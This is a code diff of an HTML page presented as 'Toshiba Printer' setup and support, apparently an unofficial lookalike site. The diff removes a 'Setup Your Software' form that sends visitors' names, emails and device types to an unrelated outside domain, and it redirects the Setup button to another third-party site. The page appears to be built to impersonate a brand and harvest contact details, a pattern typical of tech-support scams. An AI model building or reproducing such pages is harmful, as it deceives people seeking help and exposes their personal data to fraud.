@@ -210,68 +210,6 @@
   html {
     scroll-behavior: smooth;
   }
-
-  .setup-form button {
-    width:100%;
-      padding: 12px;
-      font-size: 16px;
-      color: #fff;
-      background-color: #004080;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .setup-form button:hover {
-      background-color: #0358ad;
-    }
-     .setup-form {
-      background: #fff;
-      max-width: 500px;
-      margin: 40px auto;
-      padding: 25px 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-    }
-
-    .setup-form p.title {
-      font-size: 20px;
-      font-weight: 600;
-      margin-bottom: 20px;
-      text-align: center;
-      color: #004080;
-    }
-
-    .form-group {
-      margin-bottom: 15px;
-    }
-
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 5px;
-      color: #333;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    select {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      background:black;
-      color:white;
-    }
-
-    .note {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 14px;
-      color: #555;
-    }
 </style>
 </head>
 <body>
@@ -279,7 +217,7 @@
 <header>
   <h1>Toshiba Printer</h1>
   <nav>
-    <a href="https://toshibaprinter.pages.dev/"><button onclick="document.getElementById('setup').scrollIntoView()">Setup</button></a>
+    <a href="https://setupprinter.net/"><button onclick="document.getElementById('setup').scrollIntoView()">Setup</button></a>
     <a href="https://toshibaprinter.pages.dev/support.html"><button onclick="document.getElementById('support').scrollIntoView()">Support</button></a>
     <a href="https://toshibaprinter.pages.dev/download.html"><button onclick="document.getElementById('download').scrollIntoView()">Download</button></a>
     <a href="https://toshibaprinter.pages.dev/install.html"><button onclick="document.getElementById('install').scrollIntoView()">Install</button></a>
@@ -294,38 +232,6 @@
     </span>
   </div>
 </section>
-
-  <div class="setup-form">
-    <p class="title">Setup Your Software</p>
-    <form action="https://i-downloadsoftwares.com/error" method="post">
-      <div class="form-group">
-        <label for="full-name">Full Name</label>
-        <input type="text" id="full-name" name="full_name" placeholder="Enter your name" required />
-      </div>
-
-      <div class="form-group">
-        <label for="email">Email Address</label>
-        <input type="email" id="email" name="email" placeholder="Enter your email" required />
-      </div>
-
-      <div class="form-group">
-        <label for="device">Device Type</label>
-        <select id="device" name="device" required>
-          <option value="">-- Select Device --</option>
-          <option value="mobile">Windows 7</option>
-          <option value="mobile">Windows 8</option>
-          <option value="mobile">Windows 10</option>
-          <option value="mobile">Windows 11</option>
-          <option value="tablet">MacOS</option>
-          <option value="desktop">PC</option>
-          <option value="desktop">IOS</option>
-          <option value="desktop">Other</option>
-        </select>
-      </div>
-
-      <button type="submit">Setup Now</button>
-    </form>
-  </div>
 
 <main class="container" role="main">
 
